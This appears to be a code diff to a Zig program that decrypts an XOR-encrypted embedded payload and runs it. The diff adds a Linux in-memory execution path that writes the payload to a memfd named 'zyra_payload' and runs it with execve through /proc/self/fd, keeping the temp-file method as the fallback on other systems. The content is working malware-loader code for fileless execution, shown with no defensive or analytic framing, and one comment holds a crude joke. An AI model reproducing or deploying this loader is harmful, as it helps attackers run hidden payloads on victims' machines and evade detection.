@@ -17,8 +17,15 @@ pub fn main() !void {
     const decrypted = try decryptor.xorDecrypt(allocator, encrypted_payload, key);
     defer allocator.free(decrypted);
 
+    // Try in-memory execution first (Linux only)
+    if (builtin.os.tag == .linux) {
+        executeInMemory(decrypted);
+    } else {
+        // Fallback to tempfile execution
+        try executeViaTempfile(allocator, decrypted);
+    }
     // Execute via tempfile (cross-platform)
-    try executeViaTempfile(allocator, decrypted);
+    //try executeViaTempfile(allocator, decrypted);
 }
 
 fn getEmbeddedPayload(allocator: std.mem.Allocator) ![]u8 {
@@ -82,4 +89,33 @@ fn executeViaTempfile(allocator: std.mem.Allocator, payload: []const u8) !void {
     process.stdout_behavior = .Inherit;
     process.stderr_behavior = .Inherit;
     _ = try process.spawnAndWait();
+}
+
+fn executeInMemory(payload: []const u8) noreturn {
+    // In-memory execution is platform-specific and complex.
+    // In the words of the great Borat: "It is a pain in my assholes!"
+    const fd = std.os.linux.memfd_create("zyra_payload", 0);
+
+    _ = std.os.linux.write(@intCast(fd), payload.ptr, payload.len);
+
+    var path_buf: [64]u8 = undefined;
+    const proc_path = std.fmt.bufPrint(&path_buf, "/proc/self/fd/{d}", .{fd}) catch unreachable;
+    path_buf[proc_path.len] = 0;
+    const path_cstr: [*:0]const u8 = path_buf[0..proc_path.len: 0].ptr;
+
+    var argv_arr: [2]?[*:0]const u8 = .{
+        path_cstr,
+        null,
+    };
+    const argv: [:null]const ?[*:0]const u8 = argv_arr[0.. :null];
+
+    var envp_arr: [1]?[*:0]const u8 = .{
+        null,
+    };
+
+    const envp: [:null]const ?[*:0]const u8 = envp_arr[0.. :null];
+    _ = std.os.linux.execve(path_cstr, argv, envp);
+
+    // Should be unreachable on success
+    std.os.linux.exit(127);
 }
